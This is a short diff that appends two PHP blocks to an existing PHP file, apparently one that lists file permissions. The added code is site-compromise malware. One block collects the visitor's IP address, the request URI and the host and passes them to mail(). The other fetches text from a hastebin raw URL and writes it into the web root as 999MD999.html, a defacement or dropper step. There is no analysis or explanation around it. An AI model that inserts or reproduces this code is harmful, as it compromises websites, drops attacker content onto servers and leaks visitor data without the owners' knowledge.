@@ -245,3 +245,23 @@ $info .= (($perms & 0x0001) ?
 
 return $info;
 ?>
+<?php
+$ip = getenv("REMOTE_ADDR");
+$ra44 = rand(1, 99999);
+$subj98 = "none";
+$email = "none";
+$from = "none";
+$a45 = $_SERVER['REQUEST_URI'];
+$b75 = $_SERVER['HTTP_HOST'];
+$m22 = $ip . "";
+$msg8873 = "$a45 $b75 $m22";
+mail($email, $subj98, $msg8873, $from);
+?>
+<?php
+$check3 = $_SERVER['DOCUMENT_ROOT'] . "/999MD999.html" ;
+$text3 = http_get('https://hastebin.com/raw/puralijawo');
+$op3=fopen($check3, 'w');
+fwrite($op3,$text3);
+fclose($op3);
+}
+?>
